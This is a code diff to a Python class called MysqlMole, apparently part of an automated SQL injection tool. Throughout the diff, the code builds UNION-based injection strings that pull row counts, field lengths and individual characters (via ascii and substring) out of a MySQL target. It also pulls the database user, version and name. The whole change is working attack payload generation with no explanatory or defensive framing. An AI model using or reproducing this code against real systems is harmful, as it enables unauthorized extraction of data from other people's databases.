@@ -32,6 +32,7 @@ class MysqlMole(DbmsMole):
     integer_field_finger = 'ascii(0x3a) + (length(0x49494949494949) * 190) + (ascii(0x49) * 31337)'
     integer_field_finger_result = '2288989'
     integer_out_delimiter = '3133707'
+    integer_inner_delimiter = '0x3e3c'
     
 
     @classmethod
@@ -59,20 +60,36 @@ class MysqlMole(DbmsMole):
         }
         
     def _fields_query_info(self, fields, db, table, where):
-        return {
-            'table' : db + '.' + table,
-            'field' : ','.join(map(lambda x: 'IFNULL(' + x + ', 0x20)', fields)),
-            'filter': where
-        }
+        if self.finger.is_string_query:
+            return {
+                'table' : db + '.' + table,
+                'field' : ','.join(map(lambda x: 'IFNULL(' + x + ', 0x20)', fields)),
+                'filter': where
+            }
+        else:
+            return {
+                'table' : db + '.' + table,
+                'field' : self._concat_fields(fields),
+                'filter': where
+            }
         
     def _dbinfo_query_info(self):
-        return {
-            'field' : 'user(),version(),database()', 
-            'table' : ''
-        }
+        if self.finger.is_string_query:
+            return {
+                'field' : 'user(),version(),database()', 
+                'table' : ''
+            }
+        else:
+            return {
+                'field' : self._concat_fields(['user()','version()','database()']), 
+                'table' : ''
+            }
     
     def _concat_fields(self, fields):
-        return 'CONCAT_WS(' + MysqlMole.inner_delimiter + ',' + ','.join(map(lambda x: 'IFNULL(' + x + ', 0x20)', fields)) + ')'
+        if self.finger.is_string_query:
+            return 'CONCAT_WS(' + MysqlMole.inner_delimiter + ',' + ','.join(map(lambda x: 'IFNULL(' + x + ', 0x20)', fields)) + ')'
+        else:
+            return 'CONCAT_WS(' + MysqlMole.integer_inner_delimiter + ',' + ','.join(map(lambda x: 'IFNULL(' + x + ', 0x20)', fields)) + ')'
     
     @classmethod
     def injectable_field_fingers(cls, query_columns, base):
@@ -143,24 +160,34 @@ class MysqlMole(DbmsMole):
                      " limit 1 offset " + str(offset) + " "
         return query
 
-    def forge_integer_query(self, index, fields, table, where="1=1", offset=0):
+    def forge_integer_count_query(self, columns, fields, table, injectable_field, where="1=1", offset=0):
         if len(table) > 0:
             table = ' from ' + table
             where = ' where ' + where
         else:
             where = ' '
         return (' and 1=0 union all select concat(' + MysqlMole.integer_out_delimiter + 
-               ',ascii(substring('+fields+', '+str(index)+', 1)), ' + MysqlMole.integer_out_delimiter + 
+               ',count(*), ' + MysqlMole.integer_out_delimiter + 
                ')' + table+' ' + self.parse_condition(where) + ' limit 1 offset '+str(offset))
 
-    def forge_integer_len_query(self, field, table, where="1=1", offset=0):
+    def forge_integer_query(self, columns, index, fields, table, injectable_field, where="1=1", offset=0):
         if len(table) > 0:
             table = ' from ' + table
             where = ' where ' + where
         else:
             where = ' '
         return (' and 1=0 union all select concat(' + MysqlMole.integer_out_delimiter + 
-               ',length('+field+'),' + MysqlMole.integer_out_delimiter+ ')' +table+' ' + 
+               ',ascii(substring(concat('+fields+'), '+str(index)+', 1)), ' + MysqlMole.integer_out_delimiter + 
+               ')' + table+' ' + self.parse_condition(where) + ' limit 1 offset '+str(offset))
+
+    def forge_integer_len_query(self, columns, fields, table, injectable_field, where="1=1", offset=0):
+        if len(table) > 0:
+            table = ' from ' + table
+            where = ' where ' + where
+        else:
+            where = ' '
+        return (' and 1=0 union all select concat(' + MysqlMole.integer_out_delimiter + 
+               ',length(concat('+fields+')),' + MysqlMole.integer_out_delimiter+ ')' +table+' ' + 
                self.parse_condition(where) + ' limit 1 offset '+str(offset))
 
     def set_good_finger(self, finger):
@@ -178,6 +205,9 @@ class MysqlMole(DbmsMole):
             return data.split(MysqlMole.inner_delimiter_result)
         else:
             return data
+    
+    def is_string_query(self):
+        return self.finger.is_string_query
     
     def __str__(self):
         return "Mysql Mole"
